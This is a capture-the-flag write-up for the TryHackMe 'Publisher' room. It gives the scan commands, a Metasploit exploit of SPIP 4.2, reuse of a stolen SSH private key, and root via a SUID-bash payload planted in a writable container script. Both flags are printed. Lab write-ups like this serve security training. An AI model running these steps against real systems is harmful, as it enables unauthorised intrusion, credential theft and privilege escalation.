# 🕵️‍♂️ Publisher | Writeup | 25 July 2025

![TryHackMe Logo](../images/THM.png)

![Overpass_image](../images/logo_icon.png)

---

**Author:** *Aakash Modi*

## 🚩 Table of Contents

- [Reconnaissance & Enumeration - Task 1](#reconnaissance--enumeration---task-1)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

---

# 🕵️ Reconnaissance & Enumeration - Task 1

## 🔍 Nmap Scan

**Command:**
```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN nmap_scan.txt 10.10.5.56
```
![Nmap Scan Screenshot](../images/nmap_scan.png)

---

## 📂 Directory Scan (Gobuster)

**Command:**
```bash
gobuster dir -u http://10.10.45.220/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s '200,301' -b "" -o dir_search.txt 
```
![Directory Scan Screenshot](../images/dir_search.png)

---

## 🔎 Web Vulnerability Scanning

**Nikto Scan:**
```bash
nikto -h http://10.10.209.74/ -o nikto_scan.txt
```
![Nikto Scan Screenshot](../images/nikto_scan.png)

---

## 🌐 Web Enumeration

- **Website Look:**  
  ![Website Screenshot](../images/website.png)

- **SPIP Site Found:**  
  ![SPIP Site](../images/spip_site.png)

- **SPIP Version via Wappalyzer:**  
  ![SPIP Version](../images/spip_version.png)

- **Login Page:**  
  ![Login Page](../images/login_page.png)

---

### 🔍 Exploit Search

We identified the CMS as **SPIP**.

**Command:**
```bash
searchsploit spip 4.2
```
![Searchsploit Results](../images/searchploit.png)

The exploit is also available in Metasploit.

**Metasploit Commands:**
```bash
search spip 4.2
set targeturi /spip
set lhost <YOUR_IP>
set rhost <TARGET_IP>
exploit
```
![Metasploit Search](../images/exploit_find.png)
![Metasploit Setup](../images/exploit_Setup.png)

---

## 🏁 User Flag

- **Flag:**  
  ```
  fa229046d44eda6a3598c73ad96f4ca5
  ```
  ![User Flag](../images/user_flag.png)

---

## 🔑 SSH Private Key Extraction

1. **List hidden files:**
   ```bash
   ls -a
   ```
   ![User .ssh Folder](../images/user_think_ssh.png)

2. **Copy the private SSH key to your machine:**
   
   ![Private SSH Key](../images/private_ssh_key.png)

4. **Create and set permissions:**
   ```bash
   touch id_rsa
   chmod 600 id_rsa
   ```

5. **Connect via SSH:**
   ```bash
   ssh -i id_rsa <user>@<IP>
   ```
   ![SSH Connection](../images/machine_id_rsa_ssh.png)

6. **Access as 'think' user:**
   
   ![Gained Access](../images/gain_access.png)

---

# 🚀 Privilege Escalation

## 🔎 SUID Binaries

**Find SUID binaries:**
```bash
find / -perm -u=s -exec ls -l {} \; 2>/dev/null
```
<details>
<summary>Output</summary>

```
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 177672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root dip 393144 Jul 23  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 16760 Nov 14  2022 /usr/sbin/run_container
-rwsr-xr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 38800 Feb  9  2024 /usr/bin/fusermount
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 55616 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 49976 Feb  6  2024 /usr/bin/sudo
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 67616 Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 44744 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /usr/bin/umount
```
</details>
![SUID Binaries](../images/find_sudo_privl.png)

The only suspicious binary is **run_container**. After checking hints, we look into AppArmor profiles:

![Hint](../images/hint.png)
![AppArmor Folder](../images/apparmor.png)

---

## 🔎 LinPEAS Enumeration

Run LinPEAS for further enumeration:

```bash
sh linpeas.sh
```
![LinPEAS Output](../images/linpeas.png)

Found a writable file with special permissions:

![Vulnerable File](../images/vuln.png)

---

## ⚡ Exploitation

We found `/opt/run_container.sh` is writable. Let's use it to escalate privileges.

1. **Move to /var/tmp:**
   ```bash
   cd /var/tmp
   cp /bin/bash .
   ```

2. **Edit `/opt/run_container.sh`:**
   ```bash
   #! /bin/bash
   cp /bin/bash /var/tmp/bAsh
   chmod +s /var/tmp/bAsh
   ```
   ![Exploit Code](../images/exploit_code.png)

3. **Run the SUID binary:**
   ```bash
   /usr/sbin/run_container
   ```
   ![Exploit Run](../images/exploit.png)
   ![bAsh File](../images/bAsh_file_get.png)

4. **Get root shell:**
   ```bash
   ./bAsh -p
   ```
   ![Root Access](../images/root_access.png)

---

## 🏆 Root Flag

- **Flag:**  
  ```
  3a4225cc9e85709adda6ef55d6a4f2ca
  ```
  ![Root Flag](../images/root_flag.png)

---

# 🎯 Conclusion

- All tasks completed successfully!

  ![Room Completed](../images/completed.png)

---

## 🎉 Happy Hacking!

<p align="center">
  <img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExdGlybHZ3anM0ZzRmeG0yZTQ4d21nenczejM3eWF0aTZvajB0YWl3eSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/S9d8XB557e8phGLBVS/giphy.gif" alt="Happy Hacking" width="400"/>
</p>

---